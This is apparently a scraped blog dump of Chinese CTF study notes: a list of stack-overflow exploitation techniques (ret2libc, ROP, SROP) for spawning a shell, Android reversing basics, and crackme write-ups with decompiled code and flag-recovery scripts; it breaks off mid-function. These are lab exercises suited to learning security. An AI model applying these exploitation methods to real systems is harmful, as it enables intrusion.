ret2textret2text即控制程序执行程序本身已有的的代码(.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码(也就是gadgets)，这就是我们所要说的ROP。 这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。 ret2shellcoderet2shellcode，即控制程序执行 shellcode代码。shellcode指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的shell。一般来说，shellcode需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。 在栈溢出的基础上，要想执行shellcode，需要对应的binary在运行时，shellcode所在的区域具有可执行权限。 ret2syscallret2syscall，即控制程序执行系统调用，获取 shell。 ret2libcret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置(即函数对应的 got表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。 ELSE：JOP(Jump Oriented Programming)/COP(Call Oriented Programming) ROPgadget ret2syscall, ret2libc, ret2csu, ret2reg -&gt; various gadget ret2vdso, ret2vsyscall -&gt; special gadget(mapping) ret2csu -&gt; (–depth 20) dl-resolveret2dlresolve：没有libc地址，需要调用外部函数，控制了已知地址内容。 PLT &amp; GOT PLT(Global Offset Table): push index; call GOT; jmp PLT[0] GOT(Procedure Link Table): jmp PLT[0] https://blog.csdn.net/linyt/article/details/51635768https://blog.csdn.net/linyt/article/details/51636753https://blog.csdn.net/linyt/article/details/51637832https://blog.csdn.net/linyt/article/details/51893258 SROP（Sigreturn ROP）signal Control ax &amp; sp http://www.freebuf.com/articles/network/87447.htmlhttp://blog.leanote.com/post/3191220142@qq.com/SROP tricks stack pivot：http://tacxingxing.com/2017/05/10/stack-pivot/ tls","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://qianfei11.github.io/tags/pwn/"}]},{"title":"XMan Android（一）","slug":"XMan-Android（一）","date":"2018-08-04T05:34:56.000Z","updated":"2019-02-28T08:03:42.435Z","comments":true,"path":"2018/08/04/XMan-Android（一）/","link":"","permalink":"https://qianfei11.github.io/2018/08/04/XMan-Android（一）/","excerpt":"jr大佬带我学android。","text":"jr大佬带我学android。 Android生态圈 由Google领导开发，基于Linux内核的开源操作系统 碎片化问题严重 \u0007应用市场管理不严格 厂商安全补丁推送不及时，覆盖率低 开放、分享、可定制化程度高 Android整体架构 应用程序层 Android应用程序以Java为开发语言 支持C/C++ Framework层 为应用程序开发提供API 大部分使用Java编写 例如：Resource Manage、Location Manager、Telephony Manager Android Runtime 提供了Java编程语言核心库的大多数功能 应用程序都对应独立的虚拟机 系统运行库 C/C++库，为开发者提供服务 例如：SQLite、Webkit 硬件抽象层 把Android framework与Linux kernel隔开 Linux Kernel遵循GPL协议 驱动分为user space和kernel space Linux Kernel 硬件驱动、网络、文件系统、进程管理 对kernel进行了许多其他修改 Android安全模型基于Linux的用户隔离 Linux：用户被分配自己的UID，程序可以以指定UID运行 Android：每个应用程序都有UID，UID被用于区分应用程序 应用有自己的数据存放目录 存在共享UID的特殊情况（资源共享） 应用权限 细粒度控制（网络、硬件、敏感数据） 应用通过Manifest.xml申请权限 权限检查可以由内核进行，也可以由Android系统执行 代码签名 APK必须有开发者的签名 SELinux Security Enhancements for Android 强制访问控制（MAC） 核心系统守护进程和用户应用隔离到不同domain 系统更新（刷机） 解锁、BootLoader、Recovery recovery是一个单独小型system，可以访问所有设备分区 通常只允许签名验证通过的刷写 解锁：允许替换recovery和系统镜像（将会清除所有用户数据） APK文件结构本质上是一个zip压缩包： Manifest.xml：对应用的整体描述和定义 META-INF：保存签名信息 classes.dex：Java代码编译后生成的可执行文件 res目录：存放可编译资源文件 assets目录：存放原生资源文件 lib目录：存放C/C++代码编译后的so文件 dex文件 Android可执行文件 Java代码编译而来 包含Dalvik指令集 smalii代码由字节码反汇编得到的可阅读代码。每一个smali文件代表一个类。 .class &lt;权限&gt;[修饰]&lt;类名&gt; .super &lt;父类名&gt; .source &lt;源文件名&gt; .field 字段定义 .method 方法定义 JNI Java和Native沟通的桥梁 注册：静态注册和动态注册 JNI_OnLoad：加载so文件时执行 加壳技术 反编译代价低 =&gt; 利用动态代码加载技术 =&gt; 隐藏原本的dex文件 动态加载过程隐蔽，且复杂度高 增加完整性检查，反调试措施 Android提供的动态加载方法： DexClassLoader：apk/jar/dex，可以从SD卡加载 PathClassLoader：只能加载已安装到系统中（/data/app）的apk文件 相关工具在命令行的使用apktool解包apk文件： 1java -jar apktool_2.3.0.jar d *.apk -o [output file] 打包apk文件： 1java -jar apktool_2.3.0.jar b [output file] smali/baksmalidex文件转换成smali文件： 1java -jar baksmali-2.1.3.jar -o [output file] *.dex smali文件转换成dex文件： 1java -jar smali-2.1.3.jar -o *.dex [smali file] dex2jar反编译apk文件： 1d2j-dex2jar.bat classes.dex com.j.crackme.apk拖进jadx，在MainActivity中看出逻辑： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980protected void onCreate(Bundle bundle) &#123; super.onCreate(bundle); setContentView((int) R.layout.activity_main); ((Button) findViewById(R.id.button)).setOnClickListener(new OnClickListener() &#123; public void onClick(View view) &#123; MainActivity.this.a(); EditText editText = (EditText) MainActivity.this.findViewById(R.id.edit_text); String obj = editText.getText().toString(); if (MainActivity.this.clazz != null) &#123; try &#123; if (Base64.encodeToString(((IMyClass) MainActivity.this.clazz.newInstance()).check(obj), 0).equals(\"+sfQ39PX3eGOzOGNyt/Kj90=\\n\")) &#123; Toast.makeText(MainActivity.this.getApplicationContext(), \"Good job\", 0).show(); editText.setText(String.format(\"flag&#123;%s&#125;\", new Object[]&#123;obj&#125;)); &#125; else &#123; Toast.makeText(MainActivity.this.getApplicationContext(), \"Why you say so\", 0).show(); &#125; &#125; catch (View view2) &#123; view2.printStackTrace(); &#125; &#125; &#125; &#125;); &#125; private void a() &#123; if (this.clazz == null &amp;&amp; c()) &#123; StringBuilder stringBuilder = new StringBuilder(); stringBuilder.append(getApplicationInfo().dataDir); stringBuilder.append(File.separator); stringBuilder.append(\"files\"); stringBuilder.append(File.separator); stringBuilder.append(\"plugin.jar\"); try &#123; this.clazz = new DexClassLoader(new File(stringBuilder.toString()).getAbsolutePath(), getApplicationInfo().dataDir, null, getClassLoader()).loadClass(\"com.j.base.MyClass\"); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; &#125; private boolean c() &#123; try &#123; byte[] d = d(getAssets().open(\"plugin\")); if (d == null) &#123; return false; &#125; for (int i = 0; i &lt; d.length; i++) &#123; d[i] = (byte) (d[i] ^ 239); &#125; BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(openFileOutput(\"plugin.jar\", 0)); bufferedOutputStream.write(d); bufferedOutputStream.flush(); bufferedOutputStream.close(); return true; &#125; catch (Exception e) &#123; e.printStackTrace(); return false; &#125; &#125; public byte[] d(InputStream inputStream) &#123; try &#123; ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); byte[] bArr = new byte[AccessibilityNodeInfoCompat.ACTION_NEXT_HTML_ELEMENT]; while (true) &#123; int read = inputStream.read(bArr); if (read != -1) &#123; byteArrayOutputStream.write(bArr, 0, read); &#125; else &#123; byteArrayOutputStream.flush(); byteArrayOutputStream.close(); inputStream.close(); return byteArrayOutputStream.toByteArray(); &#125; &#125; &#125; catch (InputStream inputStream2) &#123; inputStream2.printStackTrace(); return null; &#125; &#125; 在onClick中先调用了a()，然后在a()中调用了c()。c()中打开了目录下的一个plugin文件，对其逐字节和数字239进行异或，生成一个plugin.jar，然后调用其中的check()函数。d()则用来检测读取文件是否正常。根据check()对输入字符串加密后，再经过Base64加密的值与+sfQ39PX3eGOzOGNyt/Kj90=\\n相等即正确。 根据c()，写出输出plugin.jar的脚本： 然后将jar文件拖入jadx，得到check()的逻辑： 123456789public class MyClass implements IMyClass &#123; public byte[] check(String input) &#123; byte[] bytes = input.getBytes(); for (int i = 0; i &lt; bytes.length; i++) &#123; bytes[i] = (byte) (bytes[i] ^ 190); &#125; return bytes; &#125;&#125; 最后脚本得到flag： com.j.hiddendata.apk拿进jadx，在MainActivity中找到加密函数check()，但是加密函数存在于native层。可以在解压后的lib目录下将.so文件拖入ida： 在JNI_OnLoad中找到加密函数，理清函数的逻辑： 1234567891011121314151617181920212223242526272829void *key_func()&#123; _BYTE *data; // r14 __int64 index; // rdi char *v2; // rbx void *result; // rax data = malloc(0x10uLL); index = 0LL; while ( 1 ) &#123; v2 = ori; data[index] = keys[(signed int)index % 4] ^ (((unsigned int)(unsigned __int8)ori[index] &gt;&gt; (signed int)index % 4) | (ori[index] &lt;&lt; (signed int)index / 4)); if ( index == 15 ) break; if ( ++index == 16 ) goto LABEL_6; &#125; __android_log_print( 4LL, (__int64)\"hidden\", (__int64)\"%d %d %d\", (unsigned __int8)(v2[15] &gt;&gt; 3), (unsigned __int8)(8 * v2[15]));LABEL_6: result = &amp;after; after = data; return result;&#125; 这段是关键函数，这里将ori和keys进行一系列移位和异或运算，并将结果赋值给after。 下面对输入的字符串进行比较： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263unsigned __int64 __fastcall str_cmp(__m128 *a1, int a2)&#123; _BOOL4 v2; // ebp __m128 *v3; // rbx __int64 v4; // r8 unsigned __int64 result; // rax char s; // [rsp+0h] [rbp-98h] char v7; // [rsp+4h] [rbp-94h] char v8; // [rsp+8h] [rbp-90h] char v9; // [rsp+Ch] [rbp-8Ch] char v10; // [rsp+10h] [rbp-88h] char v11; // [rsp+14h] [rbp-84h] char v12; // [rsp+18h] [rbp-80h] char v13; // [rsp+1Ch] [rbp-7Ch] char v14; // [rsp+20h] [rbp-78h] char v15; // [rsp+24h] [rbp-74h] char v16; // [rsp+28h] [rbp-70h] char v17; // [rsp+2Ch] [rbp-6Ch] char v18; // [rsp+30h] [rbp-68h] char v19; // [rsp+34h] [rbp-64h] char v20; // [rsp+38h] [rbp-60h] char v21; // [rsp+3Ch] [rbp-5Ch] unsigned __int64 v22; // [rsp+70h] [rbp-28h] v22 = __readfsqword(0x28u); v2 = 0; if ( a2 == 16 ) &#123; v3 = xor(a1); sprintf(&amp;s, \"\\\\x%02x\", LOBYTE(v3-&gt;m128_u64[0])); sprintf(&amp;v7, \"\\\\x%02x\", BYTE1(v3-&gt;m128_u64[0])); sprintf(&amp;v8, \"\\\\x%02x\", BYTE2(v3-&gt;m128_u64[0])); sprintf(&amp;v9, \"\\\\x%02x\", BYTE3(v3-&gt;m128_u64[0])); sprintf(&amp;v10, \"\\\\x%02x\", BYTE4(v3-&gt;m128_u64[0])); sprintf(&amp;v11, \"\\\\x%02x\", BYTE5(v3-&gt;m128_u64[0])); sprintf(&amp;v12, \"\\\\x%02x\", BYTE6(v3-&gt;m128_u64[0])); sprintf(&amp;v13, \"\\\\x%02x\", HIBYTE(v3-&gt;m128_u64[0])); sprintf(&amp;v14, \"\\\\x%02x\", LOBYTE(v3-&gt;m128_u64[1])); sprintf(&amp;v15, \"\\\\x%02x\", BYTE1(v3-&gt;m128_u64[1])); sprintf(&amp;v16, \"\\\\x%02x\", BYTE2(v3-&gt;m128_u64[1])); sprintf(&amp;v17, \"\\\\x%02x\", BYTE3(v3-&gt;m128_u64[1])); sprintf(&amp;v18, \"\\\\x%02x\", BYTE4(v3-&gt;m128_u64[1])); sprintf(&amp;v19, \"\\\\x%02x\", BYTE5(v3-&gt;m128_u64[1])); sprintf(&amp;v20, \"\\\\x%02x\", BYTE6(v3-&gt;m128_u64[1])); sprintf(&amp;v21, \"\\\\x%02x\", HIBYTE(v3-&gt;m128_u64[1])); __android_log_print(4LL, (__int64)\"hiddendata\", (__int64)\"%s\", (__int64)&amp;s, v4); v2 = memcmp(final, v3, 0x10uLL) == 0; free(v3); &#125; result = __readfsqword(0x28u); if ( result == v22 ) result = (unsigned int)v2; return result;&#125;__m128 *__fastcall xor(__m128 *a1)&#123; __m128 *result; // rax result = (__m128 *)malloc(0x10uLL); *result = _mm_xor_ps((__m128)*after, *a1); return result;&#125; 将after与a1（即输入的字符串）进行异或，再与final进行比较。 其中keys、ori、final都能在内存中dump出来。最后写出解密脚本： 123456789ori = [0x41, 0xFF, 0xF3, 0xDB, 0x06, 0xB3, 0x69, 0xC2, 0x90, 0xA3, 0x21, 0x8F, 0x7B, 0x6D, 0x32, 0x8C]keys = [0x56, 0xFC, 0xD8, 0x66]final = [0x64, 0x32, 0x4A, 0xCD, 0x34, 0xE6, 0x5D, 0x82, 0xB6, 0x53, 0x0B, 0x39, 0xC8, 0xE7, 0x21, 0x71]flag = ''for i in range(16): tmp = keys[i % 4] ^ ((ori[i] &gt;&gt; i % 4) &amp; 0xFF | (ori[i] &lt;&lt; i / 4) &amp; 0xFF) ch = chr(tmp ^ final[i]) flag += chprint flag JNI string操作函数 jsize GetStringUTFLength(JNIEnv *env, jstring string); 以字节为单位返回字符串的UTF-8长度。 参数： env：JNI接口指针。 string：Java字符串对象。 返回值：返回字符串的UTF-8长度。 const char * GetStringUTFChars(JNIEnv *env, jstring string,jboolean *isCopy); 返回指向字符串的UTF-8字符数组的指针。该数组在被ReleaseStringUTFChars()释放前将一直有效。 如果isCopy不是NULL，*isCopy在复制完成后即被设为JNI_TRUE。如果未复制，则设为JNI_FALSE。 参数： env：JNI 接口指针。 string：Java 字符串对象。 isCopy：指向布尔值的指针。 返回值：指向UTF-8字符串的指针。如果操作失败，则为NULL。 mm_xor_si128(__m128i a , __m128i b ) 返回一个_m128i的寄存器i，将寄存器a和寄存器b对应的位进行按位异或运算。","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"android","slug":"android","permalink":"https://qianfei11.github.io/tags/android/"}]},{"title":"XMan RE（二）","slug":"XMan-RE（二）","date":"2018-08-03T02:31:27.000Z","updated":"2019-03-03T03:22:04.956Z","comments":true,"path":"2018/08/03/XMan-RE（二）/","link":"","permalink":"https://qianfei11.github.io/2018/08/03/XMan-RE（二）/","excerpt":"A7um说这都是现在最简单的逆向，还给我们见识了一波非常规re。","text":"A7um说这都是现在最简单的逆向，还给我们见识了一波非常规re。 hide_1拿到文件先file一下，是64位的ELF文件。然后strings一下，发现有upx壳。 用upx -d不能脱，改用dd直接把内存dump下来。 然后可以拖进ida开始逆。先是找到了一个藏假flag的函数，逻辑明显的错误的。 12345678910111213141516171819202122232425262728__int64 sub_4009EF()&#123; const char *v0; // rsi@4 __int64 v1; // rdx@4 __int64 result; // rax@6 char v3; // [sp+10h] [bp-70h]@3 __int64 v4; // [sp+78h] [bp-8h]@1 v4 = v28; if ( sub_43F380(0) ) sub_40EAD0(0LL, 0LL); sub_43E9B0(1LL, \"Enter the flag:\\n\", 16LL); sub_43E950(0LL, &amp;v3, 32LL); if ( (unsigned int)sub_4009AE((__int64)&amp;v3) != 0 ) &#123; v0 = \"You are right\\n\"; sub_43E9B0(1LL, \"You are right\\n\", 14LL); &#125; else &#123; v0 = \"You are wrong\\n\"; sub_43E9B0(1LL, \"You are wrong\\n\", 14LL); &#125; result = 0LL; if ( v28 != v4 ) sub_442480(1LL, v0, v1, v28 ^ v4); return result;&#125; 根据&quot;Enter the flag:\\n&quot;进行交叉引用，找到了真正藏flag的地方。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576LOAD:00000000004C8EA1 flag_place proc nearLOAD:00000000004C8EA1 000 xor edi, edi ; requestLOAD:00000000004C8EA3 000 xor rsi, rsi ; pidLOAD:00000000004C8EA6 000 xor rdx, rdx ; addrLOAD:00000000004C8EA9 000 xor r10, r10 ; dataLOAD:00000000004C8EAC 000 mov eax, 65hLOAD:00000000004C8EB1 000 syscall ; LINUX - sys_ptraceLOAD:00000000004C8EB3 000 cmp eax, 0LOAD:00000000004C8EB6 000 jnz locret_4C8FDBLOAD:00000000004C8EBC 000 xor rdi, rdiLOAD:00000000004C8EBF 000 inc rdi ; fdLOAD:00000000004C8EC2 000 mov rsi, offset aEnterTheFlag ; bufLOAD:00000000004C8EC9 000 mov rdx, 10h ; countLOAD:00000000004C8ED0 000 xor eax, eaxLOAD:00000000004C8ED2 000 inc eaxLOAD:00000000004C8ED4 000 syscall ; LINUX - sys_writeLOAD:00000000004C8ED6 000 xor rdi, rdi ; fdLOAD:00000000004C8ED9 000 xor eax, eaxLOAD:00000000004C8EDB 000 mov rsi, offset byte_6CCDB0 ; bufLOAD:00000000004C8EE2 000 mov rdx, 20h ; countLOAD:00000000004C8EE9 000 syscall ; LINUX - sys_readLOAD:00000000004C8EEB 000 cmp eax, 0LOAD:00000000004C8EEE 000 jle loc_4C8FA9LOAD:00000000004C8EF4 000 mov rdi, offset byte_6CCDB0LOAD:00000000004C8EFB 000 mov rcx, 0FFFFFFFFFFFFFFFFhLOAD:00000000004C8F02 000 xor eax, eaxLOAD:00000000004C8F04 000 repne scasbLOAD:00000000004C8F06 000 not rcxLOAD:00000000004C8F09 000 sub rcx, 1LOAD:00000000004C8F0D 000 cmp rcx, 15h ; strlen=21LOAD:00000000004C8F11 000 jnz loc_4C8FA9LOAD:00000000004C8F17 000 mov rdi, offset byte_6CCDB0LOAD:00000000004C8F1E 000 cmp byte ptr [rdi+1], 77h ; wLOAD:00000000004C8F22 000 jnz loc_4C8FA9LOAD:00000000004C8F28 000 cmp byte ptr [rdi+2], 62h ; bLOAD:00000000004C8F2C 000 jnz short loc_4C8FA9LOAD:00000000004C8F2E 000 cmp byte ptr [rdi+3], 7Bh ; &#123;LOAD:00000000004C8F32 000 jnz short loc_4C8FA9LOAD:00000000004C8F34 000 cmp byte ptr [rdi+14h], 7Dh ; &#125;LOAD:00000000004C8F38 000 jnz short loc_4C8FA9LOAD:00000000004C8F3A 000 mov rdi, offset unk_6CCDB4LOAD:00000000004C8F41 000 call trans1LOAD:00000000004C8F46 000 mov rdi, offset unk_6CCDB4LOAD:00000000004C8F4D 000 call trans2LOAD:00000000004C8F52 000 mov rdi, offset unk_6CCDB4LOAD:00000000004C8F59 000 call trans1LOAD:00000000004C8F5E 000 mov rdi, offset unk_6CCDB4LOAD:00000000004C8F65 000 call trans2LOAD:00000000004C8F6A 000 mov rdi, offset unk_6CCDB4LOAD:00000000004C8F71 000 call trans1LOAD:00000000004C8F76 000 mov rdi, offset unk_6CCDB4LOAD:00000000004C8F7D 000 call trans2LOAD:00000000004C8F82 000 mov rsi, offset qword_4C8CB0LOAD:00000000004C8F89 000 mov rdx, 0LOAD:00000000004C8F90LOAD:00000000004C8F90 loc_4C8F90: ; CODE XREF: flag_place+106↓jLOAD:00000000004C8F90 000 cmp rdx, 10hLOAD:00000000004C8F94 000 jnb short loc_4C8FB2LOAD:00000000004C8F96 000 mov al, [rdi]LOAD:00000000004C8F98 000 mov ah, [rsi]LOAD:00000000004C8F9A 000 cmp al, ahLOAD:00000000004C8F9C 000 jnz short loc_4C8FA9LOAD:00000000004C8F9E 000 inc rdxLOAD:00000000004C8FA1 000 inc rdiLOAD:00000000004C8FA4 000 inc rsiLOAD:00000000004C8FA7 000 jmp short loc_4C8F90LOAD:00000000004C8FA9 ; ---------------------------------------------------------------------------LOAD:00000000004C8FA9LOAD:00000000004C8FA9 loc_4C8FA9: ; CODE XREF: flag_place+4D↑jLOAD:00000000004C8FA9 ; flag_place+70↑j ...LOAD:00000000004C8FA9 000 mov rsi, offset aYouAreWrong ; &quot;You are wrong\\n&quot;LOAD:00000000004C8FB0 000 jmp short loc_4C8FB9LOAD:00000000004C8FB2 ; ---------------------------------------------------------------------------LOAD:00000000004C8FB2LOAD:00000000004C8FB2 loc_4C8FB2: ; CODE XREF: flag_place+F3↑jLOAD:00000000004C8FB2 000 mov rsi, offset aYouAreRight ; &quot;You are right\\n&quot; 直接根据汇编代码可以判断出flag的处理过程，经过两个加密函数，共三次加密。 第一个加密函数将flag分成前后两段，分别进行一系列按位移位操作，总共循环七次。这一段逆起来有些麻烦。 123456789101112131415161718192021222324252627282930313233343536__int64 __fastcall trans1(char *a1)&#123; __int64 result; // rax unsigned __int64 v2; // rt1 unsigned int former; // [rsp+18h] [rbp-48h] __int64 later; // [rsp+1Ch] [rbp-44h] signed int i; // [rsp+24h] [rbp-3Ch] signed int j; // [rsp+28h] [rbp-38h] int v7[5]; // [rsp+40h] [rbp-20h] unsigned __int64 v8; // [rsp+58h] [rbp-8h] v8 = __readfsqword(0x28u); v7[0] = 1883844979; v7[1] = 1165112144; v7[2] = 2035430262; v7[3] = 861484132; for ( i = 0; i &lt;= 1; ++i ) &#123; former = *(_DWORD *)&amp;a1[8 * i]; later = *(unsigned int *)&amp;a1[8 * i + 4]; for ( j = 0; j &lt;= 7; ++j ) &#123; former += (v7[BYTE4(later) &amp; 3] + HIDWORD(later)) ^ ((((unsigned int)later &gt;&gt; 5) ^ 16 * later) + later); HIDWORD(later) += 1735289196; LODWORD(later) = ((v7[(HIDWORD(later) &gt;&gt; 11) &amp; 3] + HIDWORD(later)) ^ (((former &gt;&gt; 5) ^ 16 * former) + former)) + later; &#125; *(_DWORD *)&amp;a1[8 * i] = former; *(_DWORD *)&amp;a1[8 * i + 4] = later; &#125; v2 = __readfsqword(0x28u); result = v2 ^ v8; if ( v2 != v8 ) result = ((__int64 (*)(void))loc_4C8B9A)(); return result;&#125; 第二段加密函数是个简单的异或，对称加密。 123456789101112_BYTE *__fastcall trans2(__int64 a1)&#123; _BYTE *result; // rax signed int i; // [rsp+14h] [rbp-4h] for ( i = 0; i &lt;= 15; ++i ) &#123; result = (_BYTE *)(i + a1); *result ^= i; &#125; return result;&#125; 然后通过动态调试，可以data段找到被加密过的flag，取出密文后，写出解密脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344import structdef u32(data): return struct.unpack(\"&lt;I\", data)[0]def p32(data): return struct.pack(\"&lt;I\", data)def decrypt(data): delta = 0x676E696C key = [1883844979, 1165112144, 2035430262, 861484132] for i in range(len(key)): key[i] %= 0x100000000 sum = delta * 8 high = u32(data[:4]) low = u32(data[4:8]) for i in range(8): low -= ((((high &lt;&lt; 4) % 0x100000000) ^ (high &gt;&gt; 5)) + high) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3]) low %= 0x100000000 sum -= delta high -= ((((low &lt;&lt; 4) % 0x100000000) ^ (low &gt;&gt; 5)) + low) ^ (sum + key[sum &amp; 3]) high %= 0x100000000 return p32(high) + p32(low)def xor(data): res = '' for i in range(len(data)): res += chr(ord(data[i]) ^ i) return resdef main(): s0 = [0x52, 0xB8, 0x13, 0x7F, 0x35, 0x8C, 0xF2, 0x1B, 0xF4, 0x63, 0x86, 0xD2, 0x73, 0x4F, 0x1E, 0x31] s = '' for i in range(len(s0)): s += chr(s0[i]) print s for i in range(3): flag = xor(s) s = decrypt(flag[0:8]) + decrypt(flag[8:16]) print s print 'flag:', 'qwb&#123;' + s + '&#125;'if __name__ == '__main__': main() simplecheck.apk拖进jadx，MainActivity中看到加密过程中调用了a类中的a()函数，直接打开看函数结构： 1234567891011121314151617181920212223242526272829package com.a.simplecheck;public class a &#123; private static int[] a = new int[]&#123;0, 146527998, 205327308, 94243885, 138810487, 408218567, 77866117, 71548549, 563255818, 559010506, 449018203, 576200653, 307283021, 467607947, 314806739, 341420795, 341420795, 469998524, 417733494, 342206934, 392460324, 382290309, 185532945, 364788505, 210058699, 198137551, 360748557, 440064477, 319861317, 676258995, 389214123, 829768461, 534844356, 427514172, 864054312&#125;; private static int[] b = new int[]&#123;13710, 46393, 49151, 36900, 59564, 35883, 3517, 52957, 1509, 61207, 63274, 27694, 20932, 37997, 22069, 8438, 33995, 53298, 16908, 30902, 64602, 64028, 29629, 26537, 12026, 31610, 48639, 19968, 45654, 51972, 64956, 45293, 64752, 37108&#125;; private static int[] c = new int[]&#123;38129, 57355, 22538, 47767, 8940, 4975, 27050, 56102, 21796, 41174, 63445, 53454, 28762, 59215, 16407, 64340, 37644, 59896, 41276, 25896, 27501, 38944, 37039, 38213, 61842, 43497, 9221, 9879, 14436, 60468, 19926, 47198, 8406, 64666&#125;; private static int[] d = new int[]&#123;0, -341994984, -370404060, -257581614, -494024809, -135267265, 54930974, -155841406, 540422378, -107286502, -128056922, 265261633, 275964257, 119059597, 202392013, 283676377, 126284124, -68971076, 261217574, 197555158, -12893337, -10293675, 93868075, 121661845, 167461231, 123220255, 221507, 258914772, 180963987, 107841171, 41609001, 276531381, 169983906, 276158562&#125;; public static boolean a(String str) &#123; if (str.length() != b.length) &#123; return false; &#125; int[] iArr = new int[a.length]; iArr[0] = 0; int i = 1; for (byte b : str.getBytes()) &#123; iArr[i] = b; i++; &#125; int i2 = 0; while (i2 &lt; c.length) &#123; if (a[i2] != (((b[i2] * iArr[i2]) * iArr[i2]) + (c[i2] * iArr[i2])) + d[i2] || a[i2 + 1] != (((b[i2] * iArr[i2 + 1]) * iArr[i2 + 1]) + (c[i2] * iArr[i2 + 1])) + d[i2]) &#123; return false; &#125; i2++; &#125; return true; &#125;&#125; 然后只需要根据程序逻辑，写出爆破脚本即可： 1234567891011a = [0, 146527998, 205327308, 94243885, 138810487, 408218567, 77866117, 71548549, 563255818, 559010506, 449018203, 576200653, 307283021, 467607947, 314806739, 341420795, 341420795, 469998524, 417733494, 342206934, 392460324, 382290309, 185532945, 364788505, 210058699, 198137551, 360748557, 440064477, 319861317, 676258995, 389214123, 829768461, 534844356, 427514172, 864054312]b = [13710, 46393, 49151, 36900, 59564, 35883, 3517, 52957, 1509, 61207, 63274, 27694, 20932, 37997, 22069, 8438, 33995, 53298, 16908, 30902, 64602, 64028, 29629, 26537, 12026, 31610, 48639, 19968, 45654, 51972, 64956, 45293, 64752, 37108]c = [38129, 57355, 22538, 47767, 8940, 4975, 27050, 56102, 21796, 41174, 63445, 53454, 28762, 59215, 16407, 64340, 37644, 59896, 41276, 25896, 27501, 38944, 37039, 38213, 61842, 43497, 9221, 9879, 14436, 60468, 19926, 47198, 8406, 64666]d = [0, -341994984, -370404060, -257581614, -494024809, -135267265, 54930974, -155841406, 540422378, -107286502, -128056922, 265261633, 275964257, 119059597, 202392013, 283676377, 126284124, -68971076, 261217574, 197555158, -12893337, -10293675, 93868075, 121661845, 167461231, 123220255, 221507, 258914772, 180963987, 107841171, 41609001, 276531381, 169983906, 276158562]flag = ''for i in range(34): for ch in range(32, 127): if a[i] == b[i] * ch * ch + c[i] * ch + d[i] and a[i] == b[i - 1] * ch * ch + c[i - 1] * ch + d[i - 1]: flag += chr(ch) breakprint flag magic_2file后发现是一个64位PE文件。拖进ida，需要先修改一下编译器选项，不然ida参照linux x64的调用约定来分析的函数都是错误的。 打开虚拟机，进行远程动态调试： 在进行远程动态调试过程中，先发现在puts字符串之前会对时间进行一个判断： 123456789101112131415161718192021222324252627282930313233343536373839404142434445__int64 sub_402357()&#123; __int64 result; // rax int v1; // eax __int64 v2; // r9 check_time(); result = (unsigned int)Time_data[0]; if ( !Time_data[0] ) // Time_data[0] == ture &#123; v1 = strtol(\"ca11ab1e\", 0i64, 16); result = puts_enc((const char *)&amp;unk_405220, 105i64, v1 ^ 0xBADD1917, v2); &#125; return result;&#125;__int64 check_time()&#123; __int64 result; // rax unsigned int is_time_ok; // [rsp+20h] [rbp-10h] int n; // [rsp+24h] [rbp-Ch] unsigned int n_time; // [rsp+28h] [rbp-8h] int i; // [rsp+2Ch] [rbp-4h] n_time = time64(0i64); if ( n_time &lt;= 0x5AFFE78F || n_time &gt; 0x5B028A8F ) return 0i64; srand(n_time); for ( i = 0; i &lt;= 255; ++i ) table[i] ^= rand(); n = 0; is_time_ok = 0; cal_n(table, &amp;n, &amp;is_time_ok); if ( n == 1792 ) &#123; Time_data[0] = is_time_ok; result = is_time_ok; &#125; else &#123; Time_data[0] = 0; result = 0i64; &#125; return result;&#125; 这里判定时间戳必须大于0x5AFFE78F且小于等于0x5B028A8F。 对其中的函数分析之后，直接用反编译出来的代码，进行适当调整后，对区间内的时间爆破，最后得到正确的时间戳。爆破脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;random&gt;#include &lt;time.h&gt;#include &lt;inttypes.h&gt;#include &lt;string.h&gt;#define BYTE uint8_t#define WORD uint16_t#define DWORD uint32_t#define QWORD uint64_tDWORD *get_dst_block(DWORD *dst, signed int index)&#123; DWORD *res; // rax if(index &gt;= 0 &amp;&amp; index &lt;= 255) res = &amp;dst[3 * index]; else res = 0; return res;&#125;void cal_n(DWORD *a1, unsigned int a2)&#123; DWORD *res; // rax DWORD *v3; // rax int v4; // [rsp+24h] [rbp-1Ch] DWORD *v5; // [rsp+28h] [rbp-18h] DWORD *v6; // [rsp+30h] [rbp-10h] DWORD *v7; // [rsp+38h] [rbp-8h] DWORD *ala; // [rsp+50h] [rbp+10h] signed int idxa; // [rsp+58h] [rbp+18h] ala = a1; idxa = a2; res = get_dst_block(a1, a2); v7 = res; if(res) &#123; if(idxa &amp; 0xF) v3 = get_dst_block(ala, idxa - 1); else v3 = 0; v6 = v3; if((unsigned int)(idxa + 15) &lt;= 0x1E) res = 0; else res = get_dst_block(ala, idxa - 16); v5 = res; if(v6 || res) &#123; if(v6) &#123; v7[1] = *(char *)v7 + v6[1]; v7[2] = 2 * v6[2]; &#125; if(v5) &#123; v4 = v5[1] + *(char *)v7; res = (DWORD *)v7[1]; if((DWORD *)v4 &lt; res) &#123; v7[1] = v4; v7[2] = 2 * v5[2] | 1; &#125; &#125; &#125; else v7[1] = *(char *)v7; 